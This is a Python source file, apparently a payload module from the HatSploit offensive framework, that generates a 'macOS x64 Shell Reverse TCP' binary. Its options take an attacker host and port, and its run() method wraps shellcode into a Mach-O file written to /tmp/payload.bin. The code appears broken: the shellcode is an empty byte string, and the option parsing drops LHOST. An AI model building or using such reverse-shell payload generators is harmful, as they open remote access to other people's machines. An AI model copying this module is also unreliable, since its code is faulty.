#!/usr/bin/env python3

#
# MIT License
#
# Copyright (c) 2020-2021 EntySec
#
# Permission is hereby granted, free of charge, to any person obtaining a copy
# of this software and associated documentation files (the "Software"), to deal
# in the Software without restriction, including without limitation the rights
# to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
# copies of the Software, and to permit persons to whom the Software is
# furnished to do so, subject to the following conditions:
#
# The above copyright notice and this permission notice shall be included in all
# copies or substantial portions of the Software.
#
# THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
# IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
# FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
# AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
# LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
# OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
# SOFTWARE.
#

from core.lib.module import HatSploitModule

from utils.tcp_tools import tcp_tools
from utils.hatvenom import hatvenom

class HatSploitModule(HatSploitModule):
    tcp_tools = tcp_tools()
    hatvenom = hatvenom()

    details = {
        'Name': "macOS x64 Shell Reverse TCP",
        'Module': "payload/macos/x64/shell_reverse_tcp",
        'Authors': [
            'enty8080'
        ],
        'Description': "Shell Reverse TCP Payload for macOS x64.",
        'Dependencies': [
            ''
        ],
        'Comments': [
            ''
        ],
        'Risk': "low"
    }

    options = {
        'LHOST': {
            'Description': "Local host.",
            'Value': tcp_tools.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'LPORT': {
            'Description': "Local port.",
            'Value': 4444,
            'Type': "port",
            'Required': True
        },
        'FORMAT': {
            'Description': "Output format.",
            'Value': "macho",
            'Type': None,
            'Required': True
        },
        'LPATH': {
            'Description': "Local path.",
            'Value': "/tmp/payload.bin",
            'Type': None,
            'Required': True
        }
    }

    def run(self):
        bind_port, file_format, local_file = self.parser.parse_options(self.options)
        bind_port = self.hatvenom.port_to_bytes(bind_port)

        if not file_format in self.hatvenom.formats.keys():
            self.badges.output_error("Invalid format!")
            return

        self.badges.output_process("Generating shellcode...")
        shellcode = (
            b""
        )

        self.badges.output_process("Generating payload...")
        payload = self.hatvenom.generate(file_format, 'x64', shellcode)

        self.badges.output_process("Saving to " + local_file + "...")
        with open(local_file, 'wb') as f:
            f.write(payload)
        self.badges.output_success("Successfully saved to " + local_file + "!")
